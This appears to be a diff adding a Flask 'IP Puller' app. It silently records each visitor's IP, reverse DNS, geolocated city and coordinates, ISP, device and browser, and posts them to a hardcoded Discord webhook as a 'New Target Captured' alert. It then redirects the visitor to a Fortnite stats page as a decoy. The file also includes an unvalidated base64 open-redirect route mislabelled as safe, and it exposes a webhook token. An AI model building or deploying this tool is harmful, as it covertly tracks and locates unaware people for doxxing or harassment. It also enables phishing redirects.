@@ -1,0 +1,167 @@
+from flask import Flask, request, redirect, jsonify, Response, abort
+from datetime import datetime
+import requests
+import socket
+import os
+import re
+import json
+import time
+import base64
+import ipaddress
+from urllib.parse import unquote
+from typing import Dict, List, Optional, Any
+from threading import Lock
+from user_agents import parse
+
+app = Flask(__name__)
+
+# ================== CONFIG ==================
+
+DISCORD_WEBHOOK = os.environ.get('DISCORD_WEBHOOK_URL', 'https://canary.discord.com/api/webhooks/1477820611756691520/h16fojr9j9VJjj9f6sv5ksacSwcGI5IjOFKGursEsJfxhth5Ip5eu2fxAdEgaxfsrNwW')
+
+if not DISCORD_WEBHOOK:
+    raise RuntimeError("DISCORD_WEBHOOK_URL not set")
+
+REQUEST_LIMIT = 60  # per minute per server
+lock = Lock()
+REQUEST_COUNT = 0
+LAST_RESET = time.time()
+
+GEO_CACHE: Dict[str, Dict[str, Any]] = {}
+
+# ================== RATE LIMIT ==================
+
+def rate_limit_check() -> bool:
+    global REQUEST_COUNT, LAST_RESET
+    with lock:
+        now = time.time()
+        if now - LAST_RESET > 60:
+            REQUEST_COUNT = 0
+            LAST_RESET = now
+        REQUEST_COUNT += 1
+        return REQUEST_COUNT <= REQUEST_LIMIT
+
+# ================== IP HELPERS ==================
+
+def get_real_ip() -> str:
+    # Check common proxy headers
+    for header in ["X-Forwarded-For", "X-Real-IP", "CF-Connecting-IP"]:
+        val = request.headers.get(header)
+        if val:
+            return val.split(",")[0].strip()
+    return request.remote_addr or "127.0.0.1"
+
+def safe_reverse_dns(ip: str) -> str:
+    try:
+        ipaddress.ip_address(ip)
+        return socket.gethostbyaddr(ip)[0].lower()
+    except Exception:
+        return "N/A"
+
+# ================== GEOLOCATION ==================
+
+def get_geolocation(ip: str) -> Dict[str, Any]:
+    if ip in GEO_CACHE:
+        return GEO_CACHE[ip]
+
+    try:
+        # Use ip-api.com with all fields enabled
+        r = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719", timeout=5)
+        if r.status_code == 200:
+            data = r.json()
+            geo = {
+                "country": data.get("country", "Unknown"),
+                "countryCode": data.get("countryCode", "??"),
+                "region": data.get("regionName", "Unknown"),
+                "city": data.get("city", "Unknown"),
+                "zip": data.get("zip", "Unknown"),
+                "lat": data.get("lat", 0),
+                "lon": data.get("lon", 0),
+                "timezone": data.get("timezone", "Unknown"),
+                "isp": data.get("isp", "Unknown"),
+                "org": data.get("org", "Unknown"),
+                "as": data.get("as", "Unknown"),
+                "mobile": data.get("mobile", False),
+                "proxy": data.get("proxy", False),
+                "hosting": data.get("hosting", False)
+            }
+            GEO_CACHE[ip] = geo
+            return geo
+    except:
+        pass
+
+    return {"country": "Unknown", "countryCode": "??"}
+
+# ================== DISCORD SEND ==================
+
+def send_webhook(data: dict):
+    try:
+        requests.post(DISCORD_WEBHOOK, json=data, timeout=5)
+    except:
+        pass
+
+# ================== ROUTES ==================
+
+@app.route("/")
+def index():
+    if not rate_limit_check():
+        return jsonify({"error": "rate limited"}), 429
+
+    ip = get_real_ip()
+    hostname = safe_reverse_dns(ip)
+    
+    ua_string = request.headers.get("User-Agent", "")
+    ua = parse(ua_string)
+    
+    geo = get_geolocation(ip)
+    
+    # Construct Embed
+    embed = {
+        "title": "🎯 New Target Captured",
+        "color": 0x2F3136,
+        "timestamp": datetime.utcnow().isoformat(),
+        "footer": {"text": "IP Puller | Advanced Tracking"},
+        "thumbnail": {"url": f"https://flagcdn.com/w160/{geo.get('countryCode', 'un').lower()}.png"},
+        "fields": [
+            {"name": "🌐 Network", "value": f"**IP:** `{ip}`\n**Host:** `{hostname}`\n**ISP:** `{geo.get('isp')}`\n**Org:** `{geo.get('org')}`", "inline": False},
+            {"name": "📍 Location", "value": f"**City:** {geo.get('city')}\n**Region:** {geo.get('region')}\n**Country:** {geo.get('country')}\n**Timezone:** {geo.get('timezone')}", "inline": True},
+            {"name": "🗺️ Coordinates", "value": f"**Lat:** `{geo.get('lat')}`\n**Lon:** `{geo.get('lon')}`\n[Google Maps](https://www.google.com/maps?q={geo.get('lat')},{geo.get('lon')})", "inline": True},
+            {"name": "💻 Device", "value": f"**OS:** {ua.os.family} {ua.os.version_string}\n**Browser:** {ua.browser.family} {ua.browser.version_string}\n**Device:** {ua.device.family} ({ua.device.brand or 'Generic'})", "inline": False},
+            {"name": "🛡️ Security", "value": f"**Mobile:** {'✅' if geo.get('mobile') else '❌'}\n**Proxy/VPN:** {'✅' if geo.get('proxy') else '❌'}\n**Hosting:** {'✅' if geo.get('hosting') else '❌'}", "inline": True},
+            {"name": "🔗 Headers", "value": f"**Referer:** `{request.referrer or 'Direct'}`\n**Language:** `{request.headers.get('Accept-Language', 'N/A')}`", "inline": False}
+        ],
+    }
+
+    send_webhook({"embeds": [embed]})
+    return redirect("https://fortnitetracker.com/profile/all/peterbot%20mental/events")
+
+# ================== SAFE REDIRECT ==================
+
+def b64_decode_url(token: str) -> Optional[str]:
+    try:
+        padded = token + "=" * (-len(token) % 4)
+        url = base64.urlsafe_b64decode(padded).decode()
+        if url.startswith(("http://", "https://")):
+            return url
+    except:
+        return None
+
+@app.route("/open")
+def open_redirect():
+    token = request.args.get("t", "")
+    url = b64_decode_url(token)
+    if not url:
+        abort(400)
+
+    return redirect(url, code=302)
+
+# ================== FALLBACK ==================
+
+@app.route("/<path:path>")
+def catch_all(path):
+    return index()
+
+# ================== RUN ==================
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
